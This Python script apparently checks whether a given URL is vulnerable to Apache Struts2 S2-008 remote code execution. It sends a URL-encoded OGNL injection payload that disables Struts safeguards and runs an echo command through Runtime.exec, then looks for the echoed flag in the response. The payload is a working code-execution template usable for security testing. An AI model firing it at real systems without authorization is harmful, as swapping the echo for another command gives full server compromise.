import re
import requests
import urllib

def s2_008(url):
    relsult = {
        'name': 'S2-008 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        hash_flag = 'awd21hskn72hd7s578as'
        payload1 = r'?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo awd21hskn72hd7s578as%27%29.getInputStream%28%29%29)'
        vulurl = urllib.parse.urljoin(url, payload1)
        req = requests.get(vulurl, timeout=3)
        if re.search(hash_flag, req.text):
            if re.search('echo awd21hskn72hd7s578as', req.text):
                pass
            else:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vulurl
        return relsult
    except:
        return relsult

if __name__ == '__main__':
    url = input('输入目标URL:')
    print(s2_008(url))